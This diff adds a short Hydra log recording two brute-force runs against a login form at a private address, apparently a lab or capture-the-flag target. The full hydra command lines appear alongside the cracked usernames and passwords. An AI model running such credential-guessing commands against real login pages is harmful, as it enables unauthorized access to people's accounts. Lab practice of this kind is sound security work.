@@ -1,0 +1,6 @@
+# Hydra v9.0 run at 2020-04-30 14:15:20 on 10.10.255.243 http-post-form (hydra -L /opt/userNameList/names.txt -p password -o hydra.log 10.10.255.243 http-post-form /users/login.php:username=^USER^&password=^PASS^&Login=login:The username/password combination you have entered is invalid)
+[80][http-post-form] host: 10.10.255.243   login: d'anne   password: password
+# Hydra v9.0 run at 2020-04-30 14:37:18 on 10.10.255.243 http-post-form (hydra -L /opt/userNameList/names.txt -p password -o hydra.log 10.10.255.243 http-post-form /users/login.php:username=^USER^&password=^USER^&login=login:The username/password combination you have entered is invalid)
+[80][http-post-form] host: 10.10.255.243   login: bob   password: bob
+[80][http-post-form] host: 10.10.255.243   login: bryce   password: bryce
+[80][http-post-form] host: 10.10.255.243   login: d'anne   password: d'anne
